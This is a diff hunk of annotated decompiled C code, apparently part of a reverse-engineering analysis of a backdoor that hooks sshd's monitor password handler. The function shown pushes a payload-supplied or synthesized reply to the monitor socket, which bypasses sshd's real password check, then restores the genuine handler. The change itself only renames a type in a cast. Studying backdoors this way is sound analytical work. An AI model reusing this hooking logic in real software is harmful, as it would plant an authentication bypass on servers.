@@ -54,7 +54,7 @@ int mm_answer_authpassword_hook(ssh *ssh,int sock,sshbuf *m)
     // AutoDoc: Whether the reply came from the payload or was synthesized on the stack, push it straight to the monitor socket so sshd never re-enters its password handler.
     fd_write(sock,reply_buf,reply_len,libc_imports);
     // AutoDoc: Restore the saved monitor dispatch entry so the next request drops back into sshd’s genuine `mm_answer_authpassword` implementation.
-    **(undefined8 **)(sshd_ctx + 0xa0) = *(undefined8 *)(sshd_ctx + 0xd0);
+    **(u64 **)(sshd_ctx + 0xa0) = *(u64 *)(sshd_ctx + 0xd0);
     result = 1;
   }
   return result;
